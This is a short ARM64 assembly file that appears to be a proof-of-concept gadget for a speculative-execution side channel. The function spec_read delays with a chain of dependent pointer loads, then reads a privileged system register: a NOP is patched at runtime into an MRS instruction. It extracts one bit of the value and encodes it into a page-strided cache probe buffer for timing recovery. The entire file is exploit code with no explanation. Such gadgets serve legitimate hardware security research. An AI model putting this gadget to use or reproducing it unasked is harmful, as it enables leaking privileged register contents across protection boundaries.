
#define EXT(x) _ ## x
#define LEXT(x) _ ## x ## :

; void spec_read(void *probe_buf, void *miss_buf, int bit);
    .text
    .align 2
    .globl EXT(spec_read)
LEXT(spec_read)
  LDR X1, [X1]
  LDR X1, [X1]
  LDR X1, [X1]
  LDR X1, [X1]
  LDR X1, [X1]
  NOP ;// replaced with MRS X3, SYSTEM_REG
  LSR X3, X3, X2
  AND X3, X3, #1
  ADD X0, X0, X3, LSL #12
  LDR X0, [X0]

  RET
